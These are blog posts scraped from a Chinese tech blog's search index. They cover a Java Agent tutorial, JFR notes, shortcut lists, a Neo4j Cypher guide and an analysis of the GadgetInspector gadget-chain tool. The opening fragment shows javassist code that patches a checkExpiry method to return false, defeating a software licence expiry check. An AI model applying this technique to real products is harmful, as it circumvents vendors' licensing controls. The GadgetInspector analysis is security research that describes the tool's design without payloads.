使用CtClass对象获取checkExpiry方法，类似于Java反射机制的clazz.getDeclaredMethod(xxx) CtMethod ctMethod = ctClass.getDeclaredMethod( \"checkExpiry\", new CtClass[]&#123;classPool.getCtClass(\"java.lang.String\")&#125; ); // 在checkExpiry方法执行前插入输出License到期时间代码 ctMethod.insertBefore(\"System.out.println(\\\"License到期时间：\\\" + $1);\"); // 修改checkExpiry方法的返回值，将授权过期改为未过期 ctMethod.insertAfter(\"return false;\"); // 修改后的类字节码 classfileBuffer = ctClass.toBytecode(); return classfileBuffer; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; return classfileBuffer; &#125; &#125;; &#125;&#125; Pom.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt; &lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.25.0-GA&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.sun&lt;/groupId&gt; &lt;artifactId&gt;tools&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;$&#123;java.home&#125;/../lib/tools.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;8&lt;/source&gt; &lt;target&gt;8&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;configuration&gt; &lt;archive&gt; &lt;manifest&gt; &lt;addClasspath&gt;true&lt;/addClasspath&gt; &lt;mainClass&gt;com.fxc.AttachAgent&lt;/mainClass&gt; &lt;/manifest&gt; &lt;manifestEntries&gt; &lt;Agent-Class&gt;com.fxc.AttachAgent&lt;/Agent-Class&gt; &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt; &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt; &lt;/manifestEntries&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.4&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;shade&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;filters&gt; &lt;filter&gt; &lt;artifact&gt;*:*&lt;/artifact&gt; &lt;excludes&gt; &lt;exclude&gt;MANIFEST.MF&lt;/exclude&gt; &lt;exclude&gt;META-INF/DEPENDENCIES&lt;/exclude&gt; &lt;exclude&gt;META-INF/LICENSE*&lt;/exclude&gt; &lt;exclude&gt;META-INF/NOTICE*&lt;/exclude&gt; &lt;/excludes&gt; &lt;/filter&gt; &lt;/filters&gt; &lt;artifactSet&gt; &lt;includes&gt; &lt;include&gt;org.javassist:javassist:jar:*&lt;/include&gt; &lt;/includes&gt; &lt;/artifactSet&gt; &lt;!-- 修改第三方依赖包名称 --&gt; &lt;relocations&gt; &lt;relocation&gt; &lt;pattern&gt;javassist&lt;/pattern&gt; &lt;shadedPattern&gt;com.fxc.deps.javassist&lt;/shadedPattern&gt; &lt;/relocation&gt; &lt;/relocations&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 坑点 在打包jar的时候，已经要记得将ASM/javassist打进去，maven-shade-plugin插件。","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java Agent","slug":"Java-Agent","permalink":"https://0range228.github.io/tags/Java-Agent/"}]},{"title":"JFR笔记","slug":"JFR笔记","date":"2021-01-20T01:58:30.000Z","updated":"2021-01-22T09:03:10.662Z","comments":true,"path":"JFR笔记/","link":"","permalink":"https://0range228.github.io/JFR%E7%AC%94%E8%AE%B0/","excerpt":"序言 愿君多采撷，此物最相思。 整理JFR相关知识 。","text":"序言 愿君多采撷，此物最相思。 整理JFR相关知识 。 什么是JFR？JFR 是 Java Flight Record （Java飞行记录） 的缩写，是 JVM 内置的基于事件的JDK监控记录框架。这个起名就是参考了黑匣子对于飞机的作用，将Java进程比喻成飞机飞行，==主要用于问题定位和持续监控==。 JFR性能非常高效，对于业务影响很小，因为这个框架本来就是用来长期在线上部署的框架。这个记录可以输出成二进制文件，用户可以指定最大记录时间，或者最大记录大小，供用户在需要的时候输出成文件进行事后分析。 JFR 的前身也是 JFR，只不过这个 J 不是 Java 而是 JRockit。在 JRockit 虚拟机时代，就有这样一个工具用来记录 Java 虚拟机运行时各项数据。在 Oracle 收购 Sun 公司之后，Hotspot 虚拟机时代，也一直延续了这个工具： JFR 0.9 版本对应 JDK 7 和JDK 8： 在 JDK 8u40 之后，可以在运行时灵活地打开关闭 JFR。 JFR 1.0 版本对应 JDK 9 和 JDK 10： 在这一版本之后，增加了 JFR 事件接口，用户可以生产或者消费某种事件。 JFR 2.0 版本对应 JDK 11，详细讨论说明。 JFR具有以下关键的特性： 低开销，可在生产环境核心业务进程中始终在线运行。 可以进行运行时分析，可以分析 Java 应用程序，JVM 内部以及当前Java进程运行环境等多因素。 JFR基于事件采集，可以分析非常底层的信息，例如对象分配，方法采样与热点方法定位与调用堆栈，安全点分析与锁占用时长与堆栈分析，GC 相关分析以及 JIT 编译器相关分析（例如 CodeCache ） 完善的 API 定义，用户可以自定义事件的生产与消费。 核心-Event事件在 JFR中，一切皆为 Event： 任意JVM行为都是一个Event，类加载对应 Class Load Event 开启 JFR 记录也是一个Event，对应的就是 Recording Reason Event 就算是有 Event 丢失，他也是一个 Event，对应 Data Loss Event Event 在特定的时间点产生，每个Event是由名称，时间戳还有 Event Payload组成。 Event Payload包含例如 CPU负载、Event 发生之前还有之后的 Java 堆大小、 获取锁的线程 ID 等等。 大部分的 Event，都有 Event 是在哪个线程发生的，Event 发生的时候这个线程的调用栈，Event 的持续时间。 利用这些信息，我们可以回溯 Event 发生当时的情况。 Event 分类Event 按照采集方式可以分为三种： Instant Event：顾名思义，这种 Event 在发生时就立刻采集。例如：Throw Exception Event 还有 Thread Start Event，类似于这种==在某一时刻发生的 Event==。 Duration Event：这种 Event 需要耗费一些时间，在完成的时候会记录。对于这种类型的 Event，可以设置一个时间限制，超过这个时间限制的才会记录。例如 GC Event，Thread Sleep Event。 Sample Event（Requestable Event）：按照一定的频率采集，这个频率是可以配置的。例如 Thread Dump Event，Method Sampling Event 由于 JFR 会采集很多很多的数据，为了效率，最好配置自己感兴趣的事件采集； 对于 Duration Event 设置时间限制，一般我们对于时间短的事件并不关心。 Event 会被写入 .jfr 的二进制文件（二进制文件对于应用来说读写效率最高）中，以 little endian base 128 的形式编码，这里我们用一个 Event 举个例子：","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"JFR","slug":"JFR","permalink":"https://0range228.github.io/tags/JFR/"}]},{"title":"iTerm2 快捷键速查手册","slug":"iTerm2-快捷键速查手册","date":"2020-12-23T02:33:40.000Z","updated":"2021-02-09T18:42:26.030Z","comments":true,"path":"iTerm2-快捷键速查手册/","link":"","permalink":"https://0range228.github.io/iTerm2-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/","excerpt":"序言 终南阴岭秀，积雪浮云端。 整理敲板子过程中的快捷键 。","text":"序言 终南阴岭秀，积雪浮云端。 整理敲板子过程中的快捷键 。 Tab123456789新建标签：command + t关闭标签：command + w切换标签：command + 数字 / command + 左右方向键切换全屏：command + enter查找：command + f 分屏123456789垂直分屏：command + d水平分屏：command + shift + d切换屏幕：command + option + 方向键 / command + [ 或 command + ]查看历史命令：command + ;查看剪贴板历史：command + shift + h 文本操作1234567891011121314151617181920212223242526272829清除当前行：ctrl + u到行首：ctrl + a到行尾：ctrl + e按单词移动：option + 左/右 方向键上一条命令：ctrl + p删除到文本末尾：ctrl + k搜索命令历史：ctrl + r删除当前光标的字符：ctrl + d删除光标之前的字符：ctrl + h删除光标之前的单词：ctrl + w交换光标处文本：ctrl + t清屏1：command + r清屏2：ctrl + l⌘ + 数字在各 tab 标签直接来回切换选择即复制 + 鼠标中键粘贴，这个很实用","categories":[{"name":"Shell","slug":"Shell","permalink":"https://0range228.github.io/categories/Shell/"}],"tags":[{"name":"iTerm2","slug":"iTerm2","permalink":"https://0range228.github.io/tags/iTerm2/"}]},{"title":"IDEA 快捷键速查手册","slug":"IDEA-快捷键速查手册","date":"2020-12-22T09:39:25.000Z","updated":"2021-03-06T06:06:18.939Z","comments":true,"path":"IDEA-快捷键速查手册/","link":"","permalink":"https://0range228.github.io/IDEA-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/","excerpt":"序言 大漠孤烟直，长河落日圆。 整理敲板子过程中的快捷键 。","text":"序言 大漠孤烟直，长河落日圆。 整理敲板子过程中的快捷键 。 记录try-catch：cmd+option+t 查看接口实现：option+cmd+b 搜索查看，类，api：cmd+o 函数调用：ctrl+option+h 自动补全变量：option+command+v 自动包围代码，例如添加try-catch代码块：option+command+t 生成注释块：ctrl+shift+/ 生成方法注释：/**+tab 查看所有方法：command+F12 查看继承关系：Diagram-&gt;showDiagrams 搜索：shift+command+F 格式化代码块：command+option+L 批量重命名：shift+F6 中文颜文字：shift+6 批量编写：ctrl+G 先选中某部分，然后多次ctrl+全选，直接批量编写 批量框选：option+鼠标左键拖拽 这个逆天了 感觉像画画一样 整行移动： option+shift+上/下 快速调整代码行顺序 交换位置 快速显示/隐藏当前方法体 : command + . 快速概览当前类的所有方法：command + shift + +/- 统一修改方法签名： command+F6 查看历史剪切板： command +shift+ v 代码抽取： 抽取为局部变量：command+option+v 将字符串常量提取出来 单独声明 抽取为成类的成员变量：command+option+F 抽取为成类的静态常量：command+option+C 抽取为方法入参：command+option+P 抽取为方法：command + option + M 一些for循环快捷键： 其实所有for循环都在live templates里面，当然可以自定义： iter for (String arg : args) itar Iterate elements of array for (int j = 0; j &lt; args.length; j++) itco Iterate elements of java.util.Collection for (Iterator iterator = collection.iterator(); iterator.hasNext();) itit Iterate java.util.Iterator while (iterator.hasNext()) itli Iterate elements of java.util.List for (int j = 0; j &lt; list.size(); j++) fori for (int j = 0; j &lt; ; j++) foreach for(:) 以上快捷键直接敲就行 不用.的方式去触发。 IDEA快捷键 自带Postfix 123456789101112131415161718192021\"Jack\".var -&gt; String name = \"Jack\"name.notnull / name.nn -&gt; if(name != null)inputStream.close();.try -&gt; try&amp;catchobj.cast -&gt; (TYPE_TO_CAST)objname.ifnew RuntimeException().throwlist.for / list.foriname.soutv -&gt; System.out.Println(\"name = \"+name);name.return \"%d = %d + %d\".formatpsfs -&gt; public static final String","categories":[{"name":"IDE","slug":"IDE","permalink":"https://0range228.github.io/categories/IDE/"}],"tags":[{"name":"IDEA","slug":"IDEA","permalink":"https://0range228.github.io/tags/IDEA/"}]},{"title":"Neo4j爬坑记","slug":"Neo4j爬坑记","date":"2020-12-18T07:35:26.000Z","updated":"2021-03-05T07:27:12.172Z","comments":true,"path":"Neo4j爬坑记/","link":"","permalink":"https://0range228.github.io/Neo4j%E7%88%AC%E5%9D%91%E8%AE%B0/","excerpt":"序言 一点浩然气，千里快哉风。 今天来记录自己Neo4j实战、爬坑记录。","text":"序言 一点浩然气，千里快哉风。 今天来记录自己Neo4j实战、爬坑记录。 简介图数据库只有两点：节点，关系。 节点node可以类比理解为Java里面的对象实例，关系其实就是edge边信息。 查询语句CQL：CYPHER类似SQL语句一样，在Neo4j里面是使用Cypher语句进行查询。 Cypher句法由四个不同的部分组成，每一部分都有一个特殊的规则： start——查找图形中的起始节点。 match——匹配图形模式，可以定位感兴趣数据的子图形。 where——基于某些标准过滤数据。 return——返回感兴趣的结果。 Cypher的模式匹配性质使得图形模式成为任何查询的重点问题。 常用的Neo4j CQL命令/条款如下： S.No. CQL命令/条 用法 1。 CREATE 创建 创建节点，关系和属性 2。 MATCH 匹配 检索有关节点，关系和属性数据 3。 RETURN 返回 返回查询结果 4。 WHERE 哪里 提供条件过滤检索数据 5。 DELETE 删除 删除节点和关系 6。 REMOVE 移除 删除节点和关系的属性 7。 ORDER BY以…排序 排序检索数据 8。 SET 组 添加或更新标签 命令CREATE创建Neo4j CQL创建一个没有属性的节点 1CREATE (&lt;node-name&gt;:&lt;label-name&gt;) 节点名：标签名 示例 1CREATE (emp:Employee) 或者 1CREATE (:Employee) Neo4j CQL创建具有属性的节点 Neo4j CQL“CREATE”命令用于创建带有属性的节点。 它创建一个具有一些属性（键值对）的节点来存储数据。 12345678CREATE ( &lt;node-name&gt;:&lt;label-name&gt; &#123; &lt;key&gt;:&lt;Value&gt; ........ &lt;n-key&gt;:&lt;n-Value&gt; &#125;) 示例 1CREATE (dept:Dept &#123; deptno:10, dname:&quot;Accounting&quot;, location:&quot;Hyderabad&quot;&#125;) 创建多个标签到节点 语法： 1CREATE (&lt;node-name&gt;:&lt;label-name1&gt;:&lt;label-name2&gt;.....:&lt;label-namen&gt;)复制代码 示例 1CREATE (m:Movie:Cinema:Film:Picture) 一个节点有多个标签 MATCH查询Neo4j CQL MATCH命令用于 从数据库获取有关节点和属性的数据 从数据库获取有关节点，关系和属性的数据 MATCH命令语法： 1234MATCH ( &lt;node-name&gt;:&lt;label-name&gt;) 示例 1MATCH (dept:Dept) 但是执行后会报错： 123Neo.ClientError.Statement.SyntaxError: Query cannot conclude with MATCH (must be RETURN or an update clause) (line 1, column 1 (offset: 0)) 如果你观察到错误消息，它告诉我们，我们可以使用MATCH命令与RETURN子句或UPDATE子句。 RETURN返回Neo4j CQL RETURN子句用于 - 检索节点的某些属性 检索节点的所有属性 检索节点和关联关系的某些属性 检索节点和关联关系的所有属性 RETURN命令语法： 1234RETURN &lt;node-name&gt;.&lt;property1-name&gt;, ........ &lt;node-name&gt;.&lt;propertyn-name&gt; 示例 1MATCH (e:Employee) RETURN e 或 12MATCH (dept: Dept)RETURN dept.deptno,dept.dname,dept.location 关系基础Neo4j图数据库遵循属性图模型来存储和管理其数据。 根据属性图模型，关系应该是定向的。 否则，Neo4j将抛出一个错误消息。 基于方向性，Neo4j关系被分为两种主要类型。 单向关系 双向关系 使用新节点创建关系 示例 1CREATE (e:Employee)-[r:DemoRelation]-&gt;(c:Employee) 这句会创建节点e，节点c，以及e -&gt; c的关系r，这里需要注意方向，比如双向是 1CREATE (e:Employee)&lt;-[r:DemoRelation]-&gt;(c:Employee) 使用已知节点创建带属性的关系： 12345MATCH (&lt;node1-label-name&gt;:&lt;node1-name&gt;),(&lt;node2-label-name&gt;:&lt;node2-name&gt;)CREATE (&lt;node1-label-name&gt;)-[&lt;relationship-label-name&gt;:&lt;relationship-name&gt; &#123;&lt;define-properties-list&gt;&#125;]-&gt;(&lt;node2-label-name&gt;)RETURN &lt;relationship-label-name&gt; 还是一系列键值对 示例 123MATCH (cust:Customer),(cc:CreditCard) CREATE (cust)-[r:DO_SHOPPING_WITH&#123;shopdate:\"12/12/2014\",price:55000&#125;]-&gt;(cc) RETURN r 检索关系节点的详细信息： 123MATCH (&lt;node1-label-name&gt;)-[&lt;relationship-label-name&gt;:&lt;relationship-name&gt;]-&gt;(&lt;node2-label-name&gt;)RETURN &lt;relationship-label-name&gt; 示例 12MATCH (cust)-[r:DO_SHOPPING_WITH]-&gt;(cc) RETURN cust,cc WHERE子句像SQL一样，Neo4j CQL在CQL MATCH命令中提供了WHERE子句来过滤MATCH查询的结果。 简单WHERE子句语法 1WHERE &lt;property-name&gt; &lt;comparison-operator&gt; &lt;value&gt; 语法说明： S.No. 语法元素 描述 1 WHERE 它是一个Neo4j CQL关键字。 2 &lt;属性名称&gt; 它是节点或关系的属性名称。 3 &lt;比较运算符&gt; 它是Neo4j CQL比较运算符之一。 4 &lt;值&gt; 它是一个字面值，如数字文字，字符串文字等。 Neo4j CQL中的比较运算符 Neo4j 支持以下的比较运算符，在 Neo4j CQL WHERE 子句中使用来支持条件 S.No. 布尔运算符 描述 1. = 它是Neo4j CQL“等于”运算符。 2. &lt;&gt; 它是一个Neo4j CQL“不等于”运算符。 3. &lt; 它是一个Neo4j CQL“小于”运算符。 4. &gt; 它是一个Neo4j CQL“大于”运算符。 5. &lt;= 它是一个Neo4j CQL“小于或等于”运算符。 6. = 它是一个Neo4j CQL“大于或等于”运算符。 我们可以使用布尔运算符在同一命令上放置多个条件。 Neo4j CQL中的布尔运算符 Neo4j支持以下布尔运算符在Neo4j CQL WHERE子句中使用以支持多个条件。 S.No. 布尔运算符 描述 1 AND 它是一个支持AND操作的Neo4j CQL关键字。 2 OR 它是一个Neo4j CQL关键字来支持OR操作。 3 NOT 它是一个Neo4j CQL关键字支持NOT操作。 4 XOR 它是一个支持XOR操作的Neo4j CQL关键字。 示例 123MATCH (emp:Employee) WHERE emp.name = 'Abc' OR emp.name = 'Xyz'RETURN emp 利用WHERE创建指定关系节点： 1234MATCH (cust:Customer),(cc:CreditCard) WHERE cust.id = \"1001\" AND cc.id= \"5001\" CREATE (cust)-[r:DO_SHOPPING_WITH&#123;shopdate:\"12/12/2014\",price:55000&#125;]-&gt;(cc) RETURN r 有必要补充一下，可以不使用WHERE达到WHERE的一些效果，比如 1MATCH p=(m:Bot&#123;id:123&#125;)&lt;-[:BotRelation]-&gt;(:Bot) RETURN p DELETE删除Neo4j使用CQL DELETE子句 删除节点。 删除节点及相关节点和关系。 DELETE节点子句语法 1DELETE &lt;node-name-list&gt; 示例 1MATCH (e: Employee) DELETE e DELETE节点和关系子句语法 1DELETE &lt;node1-name&gt;,&lt;node2-name&gt;,&lt;relationship-name&gt; 示例 12MATCH (cc: CreditCard)-[rel]-(c:Customer) DELETE cc,c,rel 删除所有节点与关系——delete删除单个节点：MATCH (n:Useless) DELETE n;删除单个节点和连接它的关系：MATCH (n { name: &#39;Andres&#39; })-[r]-() DELETE n, r删除所有节点和关系：MATCH (n) OPTIONAL MATCH (n)-[r]-() DELETE n,r 删除某一类关系：match (n)-[r:created]-() DELETE r REMOVE删除有时基于我们的客户端要求，我们需要向现有节点或关系添加或删除属性。 我们使用Neo4j CQL SET子句向现有节点或关系添加新属性。 我们使用Neo4j CQL REMOVE子句来删除节点或关系的现有属性。 Neo4j CQL REMOVE命令用于 删除节点或关系的标签 删除节点或关系的属性 Neo4j CQL DELETE和REMOVE命令之间的主要区别 - DELETE操作用于删除节点和关联关系。 REMOVE操作用于删除标签和属性。 Neo4j CQL DELETE和REMOVE命令之间的相似性 - 这两个命令不应单独使用。 两个命令都应该与MATCH命令一起使用。 1.REMOVE属性子句语法 1REMOVE &lt;node-name&gt;.&lt;property1-name&gt;,&lt;node-name&gt;.&lt;property2-name&gt; 示例 123MATCH (dc:DebitCard) REMOVE dc.cvvRETURN dc 2.REMOVE一个Label子句语法： 1REMOVE &lt;label-name-list&gt; S.No. 语法元素 描述 1. REMOVE 它是一个Neo4j CQL关键字。 2. 它是一个标签列表，用于永久性地从节点或关系中删除它。 语法 123&lt;node-name&gt;:&lt;label2-name&gt;, .... &lt;node-name&gt;:&lt;labeln-name&gt; 复制代码 删除标签与属性——remove删除属性：MATCH (andres { name: &#39;Andres&#39; }) REMOVE andres.age RETURN andres;删除节点的标签：MATCH (n { name: &#39;Peter&#39; }) REMOVE n:German RETURN n;删除多重标签：MATCH (n { name: &#39;Peter&#39; }) REMOVE n:German:Swedish RETURN n SET子句有时，根据我们的客户端要求，我们需要向现有节点或关系添加新属性。 要做到这一点，Neo4j CQL提供了一个SET子句。 Neo4j CQL已提供SET子句来执行以下操作。 向现有节点或关系添加新属性 添加或更新属性值 SET子句语法 1SET &lt;node-label-name&gt;.&lt;property1-name&gt;,...&lt;node-laben-name&gt;.&lt;propertyn-name&gt;复制代码 语法说明： S.No. 语法元素 描述 1 &lt;节点标签名称&gt; 这是一个节点的标签名称。 2 &lt;属性名称&gt; 它是一个节点的属性名。 示例 123MATCH (dc:DebitCard)SET dc.atm_pin = 3456RETURN dc 模式匹配模式匹配是Cypher语句的重要部分 当描述关系时，在方括号里面的冒号（：）后面指定关系的类型。当建立关系（句法上大小写敏感）时，类型必须与它定义的类型严格一致。这个简单的查询使用[：HAS_SEEN]句法描述了单个HAS_SEEN关系。 关系方向的描述是在Cypher中用ASCII实现的。关系的连接是用ASCII箭 头（单个连字符接着一个大于号或前面有一个小于号[]-&gt;或&lt;-[]）连接着它 的端点。关系的起点使用单个连字符连接（[]-）。在前面的例子中，匹配用户看过的电影（match（user）-[：HAS_SEEN]-&gt;（movie））模式指定了从user节点指向movie节点的HAS_SEEN关系。 在Cypher查询中，节点和关系都可以与标识关联，这种关联使得以后可以在同样的查询中引用同一个图形实体。下面的例子在返回语句中引用了 movie节点。 个人备忘12LOAD CSV WITH HEADERS FROM \"file:///Users/Desktop/workJava/ossez/classes.csv\" as lineMERGE (n:node &#123;classname:line.ClassName&#125;) RETURN n 123MATCH (n)OPTIONAL MATCH (n)-[r]-()DELETE n,r 123结点可以没有名字 但是label一定要有nodename：labelname 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#x2F;&#x2F;4个人CREATE (t:person &#123;name:&quot;tom&quot;, age:35, address: &quot;beijing&quot;&#125;)CREATE (p:person &#123;name:&quot;peter&quot;, age:25, address: &quot;nanjing&quot;&#125;)CREATE (a:person &#123;name:&quot;alice&quot;, age:30, address: &quot;hebei&quot;&#125;)CREATE (d:person &#123;name:&quot;donny&quot;, age:23, address: &quot;hunan&quot;&#125;)&#x2F;&#x2F;3个宠物CREATE (a:pet &#123;name:&quot;doga&quot;, age:23, address: &quot;hunan&quot;&#125;)CREATE (b:pet &#123;name:&quot;dogb&quot;, age:23, address: &quot;hunan&quot;&#125;)CREATE (c:pet &#123;name:&quot;dogc&quot;, age:23, address: &quot;hunan&quot;&#125;)&#x2F;&#x2F;5部电影CREATE (h:movie &#123;name:&quot;hulk&quot;, date:2002, nation: &quot;usa&quot;&#125;)CREATE (ca:movie &#123;name:&quot;captainamerican&quot;, date:2008, nation: &quot;usa&quot;&#125;)CREATE (he:movie &#123;name:&quot;hawkeye&quot;, date:2010, nation: &quot;usa&quot;&#125;)CREATE (i:movie &#123;name:&quot;ironman&quot;, date:2011, nation: &quot;usa&quot;&#125;)CREATE (w:movie &#123;name:&quot;widow&quot;, date:2020, nation: &quot;usa&quot;&#125;)&#x2F;&#x2F;创建关系MATCH (t:person),(a:pet)WHERE t.name &#x3D; &quot;tom&quot; AND a.name &#x3D; &quot;doga&quot;CREATE (t)-[f:feed]-&gt;(a) MATCH (t:person &#123;name:&quot;tom&quot;&#125;),(a:pet &#123;name:&quot;doga&quot;&#125;)CREATE (t)-[f:feed]-&gt;(a) MERGE (t:person &#123;name:&quot;tom&quot;&#125;)-[f:feed]-&gt;(a:pet &#123;name:&quot;doga&quot;&#125;)&#x2F;&#x2F;查询属性里有date值为2002年的东西match(n) where n.date&#x3D;2002 return nmatch(n&#123;date:2002&#125;) return n&#x2F;&#x2F; Get some dataMATCH (n1)-[r]-&gt;(n2) RETURN r, n1, n2 LIMIT 25&#x2F;&#x2F;删除person结点match (n:person) delete n&#x2F;&#x2F;只是删除feed关系 MATCH p&#x3D;()-[f:feed]-&gt;() DELETE fmatch (n)-[f:feed]-()detach delete f","categories":[{"name":"图数据库","slug":"图数据库","permalink":"https://0range228.github.io/categories/%E5%9B%BE%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"Neo4j","slug":"Neo4j","permalink":"https://0range228.github.io/tags/Neo4j/"}]},{"title":"GadgetInspector源码分析","slug":"GadgetInspector源码分析","date":"2020-11-13T09:05:55.000Z","updated":"2021-04-23T05:51:14.101Z","comments":true,"path":"GadgetInspector源码分析/","link":"","permalink":"https://0range228.github.io/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"序言 好风凭借力，送我上青云。 今天来分析gadgetinspector源码。","text":"序言 好风凭借力，送我上青云。 今天来分析gadgetinspector源码。 简介Ian Haken于2018年第26届DEFCON提出来的工具，主要是用来找出jar包内部的调用链。 这个工具有些地方很值得学习，总结一下。 关于这个工具： 这个工具不是用来寻找漏洞，而是利用已知的source-&gt;…-&gt;sink链或其相似特征发现分支利用链或新的利用链。 这个工具是在整个应用的classpath中寻找利用链。 这个工具进行了一些合理的预估风险判断（污点判断、污点传递等）。 这个工具会产生误报不是漏报（其实这里还是会漏报，这是作者使用的策略决定的，在后面的分析中可以看到）。 这个工具是基于字节码分析的，对于Java应用来说，很多时候我们并没有源码，而只有War包、Jar包或class文件。 这个工具不会生成能直接利用的Payload，具体的利用构造还需要人工参与。 在分析gadgetinspector源码的时候，大概会在以下几方面去讲解，并核心分析ASM部分，详细讲解如何进行污点分析： GadgetInspector：main方法，程序的入口，做一些配置以及数据的准备工作 MethodDiscovery：类、方法数据以及父子类、超类关系数据的搜索 PassthroughDiscovery：分析参数能影响到返回值的方法，并收集存储 CallGraphDiscovery：记录调用者caller方法和被调用者target方法的参数关联 SourceDiscovery：入口方法的搜索，只有具备某种特征的入口才会被标记收集 GadgetChainDiscovery：整合以上数据，并通过判断调用链的最末端slink特征，从而判断出可利用的gadget chain 流程介绍先写在这里： ASM的方法描述符： 方法描述符使用小括号开始，小括号内部是方法入参的类型描述符按照顺序拼接的字符串，在加上返回值的类型描述符组成，返回值是void的时候，使用V。方法的描述符不包含方法名和参数名。 初始化加载jar包内部类 12//初始化jar包，获得一个类加载器，该类加载器已经将其加载ClassLoader classLoader = initJar(args); 跟进initJar函数： 可以看到initJar将启动参数参数内的jar都保存到path里面，然后继续调用getJarClassLoader函数： getJarClassLoader: 在项目路径下，创建临时文件夹exploded-jar，在jvm shutdown自动删除； 接着将jar包内容提取到临时文件夹内部，这里面会有 接着使用URLClassLoader将jarpath加载到类加载器，并返回这个类加载器； 包装类加载器12//获取类加载器final ClassResourceEnumerator classResourceEnumerator = new ClassResourceEnumerator(classLoader); 这里就是将上一步加载我们jar的类加载器classLoader传入ClassResourceEnumerator。 跟进ClassResourceEnumerator： 最关键的是这两个函数，分析一下： 可以看到getAllClasses()函数首先调用getRuntimeClasses()函数，那么跟进getRuntimeClasses()仔细看： 目的是将rt.jar加载到这里作者注释也写到他用了一个比较hacky的方式： 他先获取JDK内部的String类的路径，加载String类的同时，类加载器还会将rt.jar的全部类一起加载，那么最后就是将rt.jar的所有类都加入到ClassResource类型的result并且返回。 其实就是获取rt.jar的所有class。 回到getAllClasses()函数，其实拿到rt.jar之后，继续将传入的jar包内的类加入到result，并最后返回。 总结： getRuntimeClasses获取rt.jar的所有class getAllClasses获取rt.jar以及classLoader加载的class 方法探索 MethodDiscovery discover() 该函数接收一个ClassResourceEnumerator类型的参数，这个参数主要将之前的类加载器(rt全部类+分析类)都包装并且传入。 获取每一个class类对象之后，进行ASM分析环节。 首先，看到在discover方法中获取了所有的类，并通过MethodDiscoveryClassVisitor去记录类和类方法信息。 跟进MethodDiscoveryClassVisitor去看看： 这里其实会将我们所有类内部的元素进行存储，例如类名、父类名、接口、是否为接口、类的全部字段、classHandle把位。 在ASM里，visit和visitEnd方法是一定会调用的，其他会按顺序来调用，那么这里就是： visit 访问类的头部 visitField 访问类属性 visitMethod 访问类方法 visitEnd save()saveData方法中会通过调用factory的serialize对数据进行序列化，然后一行一行的输出 这里重点看derive函数： 这里说一下最后的翻转，跟进去： 最后的save函数，保存格式为子类：父类： 这里说一下InheritanceMap是一个类，有两个fields： inheritanceMap 存放是子-&gt;父集合 subClassMap存放的是父-&gt;子集合 流程图探索 PassthroughDiscovery在这环节中，需要将上一环节的成果也就是classes.dat，methods.dat和inheritanceMap.dat都利用起来。 这里的passthrough数据流指的是每个方法的返回结果与方法参数的关系，这一步生成的数据会在生成passthrough调用图时用到。 主要用以发现函数返回值与传进来参数之间的污点关系，工作量最大的一个部分。 参考seebug，先看作者的一个demo： 成员/this，都是0；参数为1； FnConstant.invoke返回值与参数this(参数0，因为序列化时类的所有成员我们都能控制，所以所有成员变量都视为0参)、arg(参数1)的关系： 与this的关系：返回了this.value，即与0参有关系 与arg的关系：返回值与arg没有任何关系，即与1参没有关系 结论就是FnConstant.invoke与参数0有关，表示为FnConstant.invoke()-&gt;0 Fndefault.invoke返回值与参数this(参数0)、arg(参数1)的关系： 与this的关系：返回条件的第二个分支与this.f有关系，即与0参有关系 与arg的关系：返回条件的第一个分支与arg有关系，即与1参有关系 结论就是FnConstant.invoke与0参，1参都有关系，表示为Fndefault.invoke()-&gt;0、Fndefault.invoke()-&gt;1 